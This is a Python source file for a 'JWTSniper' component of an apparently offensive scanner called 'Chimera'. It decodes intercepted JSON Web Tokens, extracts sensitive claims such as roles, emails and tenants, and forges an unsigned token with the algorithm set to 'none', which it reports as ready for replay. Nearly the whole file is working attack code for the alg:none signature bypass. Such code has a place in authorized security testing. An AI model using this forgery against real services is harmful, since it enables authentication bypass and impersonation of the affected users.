import base64
import json
import logging
from rich.console import Console

console = Console()
log = logging.getLogger("rich")

class JWTSniper:
    def analyze_token(self, url, token):
        vulns = []
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return vulns

            # Fix Base64 padding for Python decoding
            header_b64 = parts[0] + '=' * (-len(parts[0]) % 4)
            payload_b64 = parts[1] + '=' * (-len(parts[1]) % 4)

            header = json.loads(base64.b64decode(header_b64).decode('utf-8'))
            payload = json.loads(base64.b64decode(payload_b64).decode('utf-8'))

            alg = header.get('alg', 'UNKNOWN')
            console.print(f"INFO     [Chimera] Shredding Identity Token | Alg: {alg} | Issuer: {payload.get('iss', 'Unknown')}")

            # 1. Information Disclosure (Tenant/Role Extraction)
            sensitive_keys = ['role', 'admin', 'permissions', 'email', 'tenant', 'org', 'uid', 'group']
            found_claims = {k: v for k, v in payload.items() if any(s in k.lower() for s in sensitive_keys)}
            
            if found_claims:
                console.print(f"[yellow]  ! [Chimera] Sensitive Internal Claims Mapped: {found_claims}[/yellow]")

            # 2. Algorithmic Confusion Forgery (None Alg Bypass)
            if alg.upper() != "NONE":
                # Forge the header
                forged_header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
                
                # We forge the token and intentionally leave the signature block completely empty
                forged_token = f"{forged_header}.{parts[1]}."
                
                console.print("[bold red]  ! [CRITICAL] [Chimera] Generated 'None' Algorithm Forgery Payload.[/bold red]")
                vulns.append({
                    "type": "VULN",
                    "name": "JWT Algorithm Confusion (None Alg Payload Generated)",
                    "matched-at": f"{url} (Intercepted JWT)",
                    "info": {
                        "severity": "CRITICAL",
                        "description": f"Forged Token ready for replay: {forged_token}"
                    }
                })

            return vulns
        except Exception as e:
            # Silent fail for malformed strings that aren't actually JWTs
            return vulns
